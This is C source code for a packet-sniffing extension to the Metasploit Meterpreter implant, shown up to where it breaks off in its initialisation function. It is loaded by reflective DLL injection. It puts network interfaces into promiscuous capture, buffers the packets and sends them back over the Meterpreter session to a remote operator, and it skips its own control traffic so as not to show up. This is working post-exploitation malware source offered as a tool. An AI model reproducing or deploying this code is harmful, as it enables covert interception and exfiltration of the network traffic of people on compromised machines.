/*
 * This module implements packet sniffing features
 */
#define _CRT_SECURE_NO_DEPRECATE 1
#include "../../common/common.h"

#include "sniffer.h"

#ifdef _WIN32

#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

#define check_pssdk(); if(!hMgr && pktsdk_initialize()!=0){packet_transmit_response(hErr, remote, response);return(hErr);}

HANDLE hMgr;
DWORD hErr;

DWORD pktsdk_initialize(void) {
	hMgr = MgrCreate();
	if(! hMgr){
		dprintf("sniffer>> failed to allocate a new Mgr object");
		hErr = ERROR_ACCESS_DENIED;
		return(hErr);
	}

	hErr = MgrInitialize(hMgr);
	if(hErr != HNERR_OK) {
		MgrDestroy(hMgr);
		hMgr = NULL;
	}

	dprintf("sniffer>> Mgr object initialized with return %d (handle %d)", hErr, hMgr);
	return hErr;
}

HANDLE pktsdk_interface_by_index(unsigned int fidx) {
	unsigned idx = 1;
	HANDLE hCfg;

	dprintf("sniffer>> pktsdk_interface_by_index(%d)", fidx);

	hCfg = MgrGetFirstAdapterCfg(hMgr);
	do {
		if(fidx == idx++) return hCfg;
	}while((hCfg = MgrGetNextAdapterCfg(hMgr,hCfg)) != NULL);
	return NULL;
}

int sniffer_includeports[1024];
int sniffer_excludeports[1024];

void __stdcall sniffer_receive(DWORD_PTR Param, DWORD_PTR ThParam, HANDLE hPacket, LPVOID pPacketData, DWORD IncPacketSize);

#else // posix side

#define check_pssdk()

char *get_interface_name_by_index(unsigned int fidx)
{
	unsigned int i, idx;
	char errbuf[PCAP_ERRBUF_SIZE+4];
	static char device_name[64];				// PKS, probably safe, due to snifferm mutex
	int if_error;
	struct ifaces_list *ifaces;
	pcap_if_t *interfaces, *int_iter;

	interfaces = int_iter = NULL;
	ifaces = NULL;
	idx = 1;

	memset(device_name, 0, sizeof(device_name));

	if(pcap_findalldevs(&interfaces, errbuf) == -1) {
		dprintf("pcap_findalldevs failed, trying netlink_get_interfaces, errbuf was : %s", errbuf);
		if_error = netlink_get_interfaces(&ifaces);
		if(if_error) {
			dprintf("Error when retrieving interfaces info");
			return NULL;
		}
		for (i = 0; i < ifaces->entries; i++) {
			if(fidx == ifaces->ifaces[i].index) {
				strncpy(device_name, ifaces->ifaces[i].name, sizeof(device_name)-1);
				break;
			}
		}
	}
	else { //pcap_findalldevs suceeded
		for(int_iter = interfaces; int_iter; int_iter = int_iter->next) {
			if(fidx == idx++) {
				strncpy(device_name, int_iter->name, sizeof(device_name)-1);
				break;
			}
		}
	}

	if(interfaces)
		pcap_freealldevs(interfaces);
	if (ifaces)
		free(ifaces);

	return device_name[0] ? device_name : NULL;

}

// http://www.google.com/#q=peter+packet

typedef struct PeterPacket
{
	struct pcap_pkthdr h;
	unsigned char bytes[0];
} PeterPacket;

char *packet_filter;

#define PktDestroy(x) free((void *)(x))
#define PktGetPacketSize(x) (((PeterPacket *)(x))->h.caplen)

DWORD PktGetId(DWORD handle, DWORD *thi)
{
	PeterPacket *pp = (PeterPacket *)(handle);
	*thi = pp->h.ts.tv_sec;
	return pp->h.ts.tv_usec;
}

DWORD PktGetTimeStamp(DWORD handle, DWORD *thi)
{
	__int64_t i64;
	PeterPacket *pp = (PeterPacket *)(handle);

	i64 = (pp->h.ts.tv_sec + 11644473600) * 10000000;

	*thi = (i64 & 0xffffffff00000000) >> 32;
	return (i64 & 0x00000000ffffffff);
}

#define PktGetPacketData(x) (&((PeterPacket *)(x))->bytes)

#define AdpCfgGetMaxPacketSize(x) (1514)

#endif

struct sockaddr peername;
int peername_len;

struct sockaddr_in *peername4;
struct sockaddr_in6 *peername6;

/* mutex */
LOCK *snifferm;

#define SNIFFER_MAX_INTERFACES 128 // let's hope interface index don't go above this value
#define SNIFFER_MAX_QUEUE  200000 // ~290Mb @ 1514 bytes

CaptureJob open_captures[SNIFFER_MAX_INTERFACES];

DWORD request_sniffer_interfaces(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_start(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_stop(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_stats(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_dump(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_dump_read(Remote *remote, Packet *packet);
HANDLE pktsdk_interface_by_index(unsigned int fidx);
DWORD pktsdk_initialize(void);


DWORD request_sniffer_interfaces(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	Tlv entries[8];

	/*
		0: Index
		1: Name
		2: Description
		3: Type
		4: MTU
		5: Wireless?
		6: Accessible?
		7: DHCP?
	*/
	DWORD result = ERROR_SUCCESS;

#ifdef _WIN32
	HANDLE hCfg;
	unsigned int idx = 1;

	check_pssdk();

	hCfg = MgrGetFirstAdapterCfg(hMgr);

	do
	{
		unsigned char *aname = (unsigned char *)AdpCfgGetAdapterNameA(hCfg);
		unsigned char *adesc = (unsigned char *)AdpCfgGetAdapterDescriptionA(hCfg);
		unsigned int ahand = htonl((unsigned int)hCfg);
		unsigned int atype = htonl(AdpCfgGetAdapterType(hCfg));
		unsigned int amtu  = htonl(AdpCfgGetMaxPacketSize(hCfg));
		unsigned int aidx  = htonl(idx);

		BOOL awireless = AdpCfgIsWireless(hCfg);
		BOOL ausable   = AdpCfgGetAccessibleState(hCfg);
		BOOL adhcp     = AdpCfgGetDhcpState(hCfg);

		memset(entries, 0, sizeof(entries));

		dprintf("sniffer>> interface %d - %s - %s", idx, aname, adesc);

		entries[0].header.type   = TLV_TYPE_UINT;
		entries[0].header.length = sizeof(unsigned int);
		entries[0].buffer        = (PUCHAR)&aidx;

		entries[1].header.type   = TLV_TYPE_STRING;
		entries[1].header.length = strlen(aname)+1;
		entries[1].buffer        = aname;

		entries[2].header.type   = TLV_TYPE_STRING;
		entries[2].header.length = strlen(adesc)+1;
		entries[2].buffer        = adesc;

		entries[3].header.type   = TLV_TYPE_UINT;
		entries[3].header.length = sizeof(unsigned int);
		entries[3].buffer        = (PUCHAR)&atype;

		entries[4].header.type   = TLV_TYPE_UINT;
		entries[4].header.length = sizeof(unsigned int);
		entries[4].buffer        = (PUCHAR)&amtu;

		entries[5].header.type   = TLV_TYPE_BOOL;
		entries[5].header.length = sizeof(BOOL);
		entries[5].buffer        = (PUCHAR)&awireless;

		entries[6].header.type   = TLV_TYPE_BOOL;
		entries[6].header.length = sizeof(BOOL);
		entries[6].buffer        = (PUCHAR)&ausable;

		entries[7].header.type   = TLV_TYPE_BOOL;
		entries[7].header.length = sizeof(BOOL);
		entries[7].buffer        = (PUCHAR)&adhcp;

		packet_add_tlv_group(response, TLV_TYPE_SNIFFER_INTERFACES, entries, 8);

		idx++;
	}while((hCfg = MgrGetNextAdapterCfg(hMgr,hCfg)) != NULL);

#else
	char errbuf[PCAP_ERRBUF_SIZE+4];
	int aidx = htonl(1);				// :~(
	struct ifaces_list *ifaces;
	uint32_t i;
	int aidx_bigendian;
	int mtu_bigendian;

	int yes_int = htonl(1);
	int no_int = 0;
	int mtu_int = htonl(1514);

	pcap_if_t *interfaces, *int_iter;

	interfaces = int_iter = NULL;
	ifaces = NULL;

	do {
		result = pcap_findalldevs(&interfaces, errbuf);

		if(!result) { // pcap_findalldevs suceeded
			for(int_iter = interfaces; int_iter; int_iter = int_iter->next)
			{
				entries[0].header.type   = TLV_TYPE_UINT;
				entries[0].header.length = sizeof(unsigned int);
				entries[0].buffer        = (PUCHAR)&aidx;

				entries[1].header.type   = TLV_TYPE_STRING;
				entries[1].header.length = strlen(int_iter->name)+1;
				entries[1].buffer        = (PUCHAR)int_iter->name;

				entries[2].header.type   = TLV_TYPE_STRING;
				entries[2].header.length = strlen(int_iter->name)+1;
				entries[2].buffer        = (PUCHAR)int_iter->name;

				entries[3].header.type   = TLV_TYPE_UINT;
				entries[3].header.length = sizeof(unsigned int);
				entries[3].buffer        = (PUCHAR)&no_int;		// xxx, get encapsulation type?

				entries[4].header.type   = TLV_TYPE_UINT;
				entries[4].header.length = sizeof(unsigned int);
				entries[4].buffer        = (PUCHAR)&mtu_int;		// PKS :-(

				entries[5].header.type   = TLV_TYPE_BOOL;
				entries[5].header.length = sizeof(BOOL);
				entries[5].buffer        = (PUCHAR)&no_int;		// check encaps options / crap

				entries[6].header.type   = TLV_TYPE_BOOL;
				entries[6].header.length = sizeof(BOOL);
				entries[6].buffer        = (PUCHAR)&yes_int;		// sure, why not.

				entries[7].header.type   = TLV_TYPE_BOOL;
				entries[7].header.length = sizeof(BOOL);
				entries[7].buffer        = (PUCHAR)&no_int;		// hrm. not worth it.

				packet_add_tlv_group(response, TLV_TYPE_SNIFFER_INTERFACES, entries, 8);
				aidx = htonl(ntohl(aidx)+1);	// :~(
			}
		} else {
			dprintf("pcap_findalldevs() failed, trying netlink_get_interfaces now, errbuf was %s", errbuf);
			result = netlink_get_interfaces(&ifaces);
			if(result) {
				dprintf("Error when retrieving interfaces info");
				break;
			}
			// netlink_get_interfaces suceeded
			for (i = 0; i < ifaces->entries; i++)
			{
				aidx_bigendian		 = htonl(ifaces->ifaces[i].index); 
				entries[0].header.type   = TLV_TYPE_UINT;
				entries[0].header.length = sizeof(uint32_t);
				entries[0].buffer        = (PUCHAR)&aidx_bigendian;

				entries[1].header.type   = TLV_TYPE_STRING;
				entries[1].header.length = strlen(ifaces->ifaces[i].name)+1;
				entries[1].buffer        = (PUCHAR)ifaces->ifaces[i].name;

				entries[2].header.type   = TLV_TYPE_STRING;
				entries[2].header.length = strlen(ifaces->ifaces[i].name)+1;
				entries[2].buffer        = (PUCHAR)ifaces->ifaces[i].name;

				entries[3].header.type   = TLV_TYPE_UINT;
				entries[3].header.length = sizeof(unsigned int);
				entries[3].buffer        = (PUCHAR)&no_int;		// xxx, get encapsulation type?

				mtu_bigendian		 = htonl(ifaces->ifaces[i].mtu);
				entries[4].header.type   = TLV_TYPE_UINT;
				entries[4].header.length = sizeof(uint32_t);
				entries[4].buffer        = (PUCHAR)&mtu_bigendian;

				entries[5].header.type   = TLV_TYPE_BOOL;
				entries[5].header.length = sizeof(BOOL);
				entries[5].buffer        = (PUCHAR)&no_int;		// check encaps options / crap

				entries[6].header.type   = TLV_TYPE_BOOL;
				entries[6].header.length = sizeof(BOOL);
				entries[6].buffer        = (PUCHAR)&yes_int;		// sure, why not.

				entries[7].header.type   = TLV_TYPE_BOOL;
				entries[7].header.length = sizeof(BOOL);
				entries[7].buffer        = (PUCHAR)&no_int;		// hrm. not worth it.

				packet_add_tlv_group(response, TLV_TYPE_SNIFFER_INTERFACES, entries, 8);
			}

		}		

	} while(0);

	if(ifaces)
		free(ifaces);
	if(interfaces)
		pcap_freealldevs(interfaces);


#endif

	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

#ifdef _WIN32

void __stdcall sniffer_receive(DWORD_PTR Param, DWORD_PTR ThParam, HANDLE hPacket, LPVOID pPacketData, DWORD IncPacketSize) {
	CaptureJob *j;
	HANDLE pkt;
	unsigned char *pktbuf;
	unsigned char *pktmax;
 	struct eth_hdr *eth;
 	struct ip_hdr *ip;
 	struct tcp_hdr *tcp;
//	struct udp_hdr *udp;

	j = (CaptureJob *)Param;
	pktbuf = (unsigned char *)pPacketData;
	pktmax = pktbuf + IncPacketSize;

	// Only process active jobs
	if(!j->active) return;

	// Traffic filtering goes here
	do {
		// Skip matching on short packets
		if(IncPacketSize < ETH_HDR_LEN + IP_HDR_LEN + TCP_HDR_LEN){
			dprintf("sniffer>> skipping exclusion because the packet is too small");
			break;
		}

		// Match IP packets
 		if(!peername4) {
			dprintf("sniffer>> skipping exclusion because peername4 is not defined");
			break;
		}

		// Skip non-IP packets
 		eth = (struct eth_hdr *) pktbuf;
 		if(ntohs(eth->eth_type) != ETH_TYPE_IP) {
			dprintf("sniffer>> skipping non-IP packet from filter");
			break;
		}

		// Skip non-TCP/UDP packets
 		ip = (struct ip_hdr *) &pktbuf[ETH_HDR_LEN];
 		if(ip->ip_p != IP_PROTO_TCP && ip->ip_p != IP_PROTO_UDP) {
 			dprintf("sniffer>> skipping non-TCP/UDP packet from filter: %d", ip->ip_p);
			break;
		}

 		if(ip->ip_p == IP_PROTO_TCP) {
 			tcp = (struct tcp_hdr *) &pktbuf[ETH_HDR_LEN + (ip->ip_hl * 4)];
 			if( (unsigned char *)tcp + TCP_HDR_LEN > pktmax) {
				dprintf("sniffer>> TCP packet is too short");
				break;
			}

			// Ignore our own control session's traffic
 			if ( (memcmp(&ip->ip_src,  &peername4->sin_addr, 4) == 0 && tcp->th_sport == peername4->sin_port) ||
 				 (memcmp(&ip->ip_dst, &peername4->sin_addr, 4) == 0 && tcp->th_dport == peername4->sin_port) ) {
				return;
			}
			// TODO: Scan through a list of included/excluded ports
		}

		// All done matching exclusions
	} while(0);

	// Thread-synchronized access to the queue

	//    -- PKS, per job locking would be finer grained.
	//       however, it probably doesn't matter.

	lock_acquire(snifferm);

	if(j->idx_pkts >= j->max_pkts) j->idx_pkts = 0;
	j->cur_pkts++;
	j->cur_bytes += IncPacketSize;

	pkt = PktCreate(j->mtu);
	PktCopyPacketToPacket(pkt, hPacket);
	if(j->pkts[j->idx_pkts])
			PktDestroy(j->pkts[j->idx_pkts]);
	j->pkts[j->idx_pkts] = pkt;
	j->idx_pkts++;

	lock_release(snifferm);
}

#else

void packet_handler(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
{
	CaptureJob *j = (CaptureJob *)(user);
	PeterPacket *pkt;

	if(! j->active) {
		dprintf("calling pcap_breakloop because job is no longer active");
		pcap_breakloop(j->pcap);
		return;
	}

	pkt = calloc(sizeof(PeterPacket) + h->caplen, 1);
	if(! pkt) {
		dprintf("ho hum, no memory. maybe a pcap_breakloop / stop running?");
		return;
	}

	memcpy(&(pkt->h), h, sizeof(struct pcap_pkthdr));
	memcpy(&(pkt->bytes), bytes, h->caplen);

	// PKS, so tempted to implement per job locks.
	// must fight temptation. :-)

	// could be interesting to try and find a lockless way of implementing it.
	// though the j->idx_pkts >= j->max_pkts is annoying :p

	lock_acquire(snifferm);

	j->cur_pkts ++;
	j->cur_bytes += h->caplen;

	if(j->idx_pkts >= j->max_pkts) j->idx_pkts = 0;

	if(j->pkts[j->idx_pkts]) free((void*)(j->pkts[j->idx_pkts]));

	j->pkts[j->idx_pkts++] = pkt;

	lock_release(snifferm);

	dprintf("new packet inserted. now pkts %d / bytes %d", j->cur_pkts, j->cur_bytes);

}

DWORD sniffer_thread(THREAD *thread)
{
	int fd;
	fd_set rfds;
	struct timeval tv;
	int count;

	CaptureJob *j = (CaptureJob *)(thread->parameter1);
	fd = pcap_get_selectable_fd(j->pcap);

	dprintf("pcap @ %p, selectable fd is %d", j->pcap, fd);

	while(event_poll(thread->sigterm, 0) == FALSE && j->active) {
		tv.tv_sec = 0;
		tv.tv_usec = 5000;

		FD_ZERO(&rfds);
		FD_SET(pcap_get_selectable_fd(j->pcap), &rfds);

		select(fd+1, &rfds, NULL, NULL, &tv);

		count = pcap_dispatch(j->pcap, 100, packet_handler, (u_char *)(j));
		if (-1 == count)
			dprintf("pcap error: %s", pcap_geterr(j->pcap));

		if(count <= 0) continue;
		if(count) dprintf("dispatched %d packets", count);
	}

	dprintf("and we're done");
	return 0;
}

#define min(a,b) (a < b ? a : b)
#define max(a,b) (a > b ? a : b)

#endif

DWORD request_sniffer_capture_start(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	unsigned int maxp;
	CaptureJob *j;
	DWORD result;
	HANDLE ifh;

#ifndef _WIN32
	char errbuf[PCAP_ERRBUF_SIZE+4];
	char *name;
#endif

	check_pssdk();
	dprintf("sniffer>> start_capture()");

	ifid = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_INTERFACE_ID);
	maxp = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_PACKET_COUNT);
	maxp = min(maxp, SNIFFER_MAX_QUEUE);
	maxp = max(maxp, 1);

	result = ERROR_SUCCESS;

	do {
		// the interface is invalid
		if(ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

#ifdef _WIN32
		ifh = pktsdk_interface_by_index(ifid);
		if(ifh == NULL) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}
#else
		ifh = ifid;
#endif

		j = &open_captures[ifid];

		// the interface is already being captured
		if(j->active) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

#ifdef _WIN32
		j->adp = AdpCreate();
		dprintf("sniffer>> capture_start() AdpCreate: 0x%.8x", j->adp);

		AdpSetConfig(j->adp,ifh);
		hErr = AdpOpenAdapter(j->adp);
		dprintf("sniffer>> capture_start() AdpOpenAdapter: 0x%.8x", hErr);
		if (hErr != HNERR_OK) {
			AdpDestroy(j->adp);
			result = hErr;
			break;
		}
#else
		name = get_interface_name_by_index(ifh);

		if(! name) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j->pcap = pcap_open_live(name, 65535, 1, 1000, errbuf);
		if(! j->pcap) {
			result = EACCES;
			break;
		}

		if(packet_filter) {
			struct bpf_program bpf;
			char *add_filter;
			char *real_filter = NULL;
			int rc;

			dprintf("handling packet_filter");

			add_filter = packet_get_tlv_value_string(packet,TLV_TYPE_SNIFFER_ADDITIONAL_FILTER);

			dprintf("add_filter = %p (%s)", add_filter, add_filter ? add_filter : "");

			if(add_filter) {
				asprintf(&real_filter, "%s and (%s)", packet_filter, add_filter);
			} else {
				real_filter = strdup(packet_filter);
			}

			dprintf("the real filter string we'll be using is '%s'", real_filter);

			rc = pcap_compile(j->pcap, &bpf, real_filter, 1, 0);
			free(real_filter);

			if(rc == -1) {
				dprintf("pcap compile reckons '%s' is a failure because of '%s'",
					real_filter, pcap_geterr(j->pcap));

				result = ERROR_INVALID_PARAMETER;
				break;
			}

			dprintf("compiled filter, now setfilter()'ing");

			rc = pcap_setfilter(j->pcap, &bpf);
			pcap_freecode(&bpf);

			if(rc == -1) {
				dprintf("can't set filter because '%s'", pcap_geterr(j->pcap));

				result = ERROR_INVALID_PARAMETER;
				break;
			}

			dprintf("filter applied successfully");
		}

		j->thread = thread_create((THREADFUNK) sniffer_thread, j, NULL);
		if(! j->thread) {
			pcap_close(j->pcap);
			break;
		}

#endif

		j->pkts = calloc(maxp, sizeof(HANDLE));
		if(j->pkts == NULL) {
#ifdef _WIN32
			AdpCloseAdapter(j->adp);
			AdpDestroy(j->adp);
#else
			pcap_close(j->pcap);
#endif
			result = ERROR_ACCESS_DENIED;
			break;
		}

		j->active   = 1;
		j->intf     = ifid;
		j->max_pkts = maxp;
		j->cur_pkts = 0;
		j->mtu      = AdpCfgGetMaxPacketSize(AdpGetConfig(j->adp));

#ifdef _WIN32
		AdpSetOnPacketRecv(j->adp, (FARPROC) sniffer_receive, (DWORD_PTR)j);
		AdpSetMacFilter(j->adp, mfAll);
#else
		thread_run(j->thread);
#endif

	} while(0);

	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_stop(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	CaptureJob *j;
	DWORD result;

	check_pssdk();
	dprintf("sniffer>> stop_capture()");

	ifid = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> stop_capture(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do {
		// the interface is invalid
		if(ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface is not being captured
#ifdef _WIN32
		if(! j->adp)
#else
		if(! j->pcap)
#endif
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		lock_acquire(snifferm);

		j->active = 0;
#ifdef _WIN32
		AdpSetMacFilter(j->adp, 0);
		AdpCloseAdapter(j->adp);
		AdpDestroy(j->adp);
#else
		thread_sigterm(j->thread);
		thread_join(j->thread);		// should take less than 1 second :p
#endif

		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, j->cur_pkts);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, (unsigned int) j->cur_bytes);

		lock_release(snifferm);

		dprintf("sniffer>> stop_capture() interface %d processed %d packets/%d bytes", j->intf, j->cur_pkts, j->cur_bytes);
	} while(0);

	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_release(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	unsigned int ifid,i;
	CaptureJob *j;
	DWORD result;

	check_pssdk();
	dprintf("sniffer>> release_capture()");

	ifid = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> release_capture(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do {
		// the interface is invalid
		if(ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface is not being captured
#ifdef _WIN32
		if(! j->adp || j->active == 1)
#else
		if(! j->pcap || j->active == 1)
#endif
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		lock_acquire(snifferm);

		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, j->cur_pkts);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, (unsigned int) j->cur_bytes);
		dprintf("sniffer>> release_capture() interface %d released %d packets/%d bytes", j->intf, j->cur_pkts, j->cur_bytes);

		for(i=0; i<j->max_pkts; i++) {
			if(!j->pkts[i]) break;
			PktDestroy(j->pkts[i]);
			j->pkts[i] = NULL;
		}
		free(j->pkts);
		memset(j, 0, sizeof(CaptureJob));

		lock_release(snifferm);


	} while(0);

	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_stats(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	CaptureJob *j;
	DWORD result;

	check_pssdk();
	dprintf("sniffer>> capture_stats()");

	ifid = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> capture_stats(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do {
		// the interface is invalid
		if(ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface was not captured
#ifdef _WIN32
		if(! j->adp)
#else
		if(! j->pcap)
#endif
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}
		lock_acquire(snifferm);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, j->cur_pkts);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, (unsigned int) j->cur_bytes);
		lock_release(snifferm);
	} while(0);

	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_dump_read(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	unsigned int ifid, i;
	unsigned int bcnt;
	CaptureJob *j;
	DWORD result;

	check_pssdk();
	dprintf("sniffer>> capture_dump_read()");

	ifid = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_INTERFACE_ID);
	bcnt = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_BYTE_COUNT);
	bcnt = min(bcnt, 32*1024*1024);

	dprintf("sniffer>> capture_dump_read(0x%.8x, %d)", ifid, bcnt);

	result = ERROR_SUCCESS;

	do {
		// the interface is invalid
		if(ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES) {
			packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, 0);
			goto fail;
		}

		j = &open_captures[ifid];
		if(! j->dbuf) {
			packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, 0);
			goto fail;
		}

		if(j->didx + bcnt > j->dlen) {
			bcnt = j->dlen - j->didx;
		}

		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, bcnt);
		packet_add_tlv_raw(response, TLV_TYPE_SNIFFER_PACKET, (unsigned char *)j->dbuf+j->didx, bcnt);
		j->didx += bcnt;
	} while(0);

	// Free memory if the read is complete
	if(j->didx >= j->dlen-1) {
		free(j->dbuf);
		j->dbuf = NULL;
		j->didx = 0;
		j->dlen = 0;
		// if dump occurs when interface is not active, i.e sniff has ended, release info
		if (j->active == 0) {
			dprintf("sniffer>> capture_dump_read, release CaptureJob");
			lock_acquire(snifferm);
			for(i=0; i<j->max_pkts; i++) {
				if(!j->pkts[i]) break;
				PktDestroy(j->pkts[i]);
				j->pkts[i] = NULL;
			}
			free(j->pkts);
			memset(j, 0, sizeof(CaptureJob));
			lock_release(snifferm);
		}
	}

fail:
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}


DWORD request_sniffer_capture_dump(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	unsigned int rbuf,mbuf;
	unsigned int *tmp;

	CaptureJob *j;
	DWORD result,pcnt,rcnt,i;
	DWORD thi, tlo;

	check_pssdk();
	dprintf("sniffer>> capture_dump()");

	ifid = packet_get_tlv_value_uint(packet,TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> capture_dump(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	lock_acquire(snifferm);

	do {
		// the interface is invalid
		if(ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES) {
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface was not captured
#ifdef _WIN32
		if(! j->adp)
#else
		if(! j->pcap)
#endif
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		// Free any existing packet buffer
		if(j->dbuf) {
			free(j->dbuf);
			j->dbuf = NULL;
			j->dlen = 0;
			j->didx = 0;
		}

		// Add basic stats
		pcnt = 0;
		rcnt = 0;

		mbuf = (1024*1024);
		j->dbuf = malloc(mbuf);
		rbuf = 0;

		for(i=0; i<j->max_pkts; i++) {
			if(!j->pkts[i]) break;

			rbuf += (8 + 8 + 4 + PktGetPacketSize(j->pkts[i]));
			if(mbuf < rbuf) {
				mbuf += (1024*1024);
				j->dbuf = realloc(j->dbuf, mbuf);

				if(!j->dbuf) {
					dprintf("sniffer>> realloc of %d bytes failed!", rbuf);
					result = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}
			}

			tmp = (unsigned int *)( j->dbuf + rcnt );
			tlo = PktGetId(j->pkts[i], &thi);
			*tmp = htonl(thi); tmp++;
			*tmp = htonl(tlo); tmp++;

			tlo = PktGetTimeStamp(j->pkts[i], &thi);
			*tmp = htonl(thi); tmp++;
			*tmp = htonl(tlo); tmp++;

			tlo = PktGetPacketSize(j->pkts[i]);
			*tmp = htonl(tlo); tmp++;

			memcpy(j->dbuf+rcnt+20, PktGetPacketData(j->pkts[i]), tlo);

			rcnt += 20 + tlo;
			pcnt++;

			PktDestroy(j->pkts[i]);
			j->pkts[i] = NULL;
		}

		j->dlen = rcnt;

		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, pcnt);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, rcnt);

		dprintf("sniffer>> finished processing packets");

		j->cur_bytes = 0;
		j->cur_pkts  = 0;
		j->idx_pkts  = 0;
	} while(0);

	lock_release(snifferm);
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

Command customCommands[] =
{
	// List interfaces
	{ "sniffer_interfaces",
	  { request_sniffer_interfaces,                          { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Start sniffing
	{ "sniffer_capture_start",
	  { request_sniffer_capture_start,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Stop sniffing
	{ "sniffer_capture_stop",
	  { request_sniffer_capture_stop,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Sniffing stats
	{ "sniffer_capture_stats",
	  { request_sniffer_capture_stats,                       { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Release captured packets instead of downloading them
	{ "sniffer_capture_release",
	  { request_sniffer_capture_release,                     { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Sniffing packet dump
	{ "sniffer_capture_dump",
	  { request_sniffer_capture_dump,                        { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Sniffing packet dump read
	{ "sniffer_capture_dump_read",
	  { request_sniffer_capture_dump_read,                   { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                        },
	},
	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	}
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	dprintf("[SERVER] Registering command handlers...");
	for (index = 0; customCommands[index].method; index++) {
		dprintf("Registering command index %d", index);
		dprintf("  Command: %s", customCommands[index].method);
		dprintf(" Register: 0x%.8x", command_register);
		command_register(&customCommands[index]);
	}

	dprintf("[SERVER] Memory reset of open_captures...");
	memset(open_captures, 0, sizeof(open_captures));

#ifdef _WIN32
	// initialize structures for the packet sniffer sdk
